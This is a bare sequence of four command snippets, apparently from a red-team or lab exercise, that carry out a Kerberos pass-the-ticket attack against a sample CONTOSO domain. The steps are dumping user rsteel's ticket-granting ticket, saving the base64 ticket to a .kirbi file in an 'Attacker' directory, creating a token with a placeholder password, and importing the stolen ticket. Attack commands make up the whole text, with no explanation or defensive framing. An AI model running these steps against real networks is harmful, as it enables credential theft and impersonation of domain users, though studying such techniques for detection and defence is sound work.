```
krb_dump /user:rsteel /service:krbtgt
```

```
[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\rsteel.kirbi", [Convert]::FromBase64String("[B64 TICKET]"))
```

```
make_token CONTOSO\rsteel FakePass
```

```
kerberos_ticket_use C:\Users\Attacker\Desktop\rsteel.kirbi
```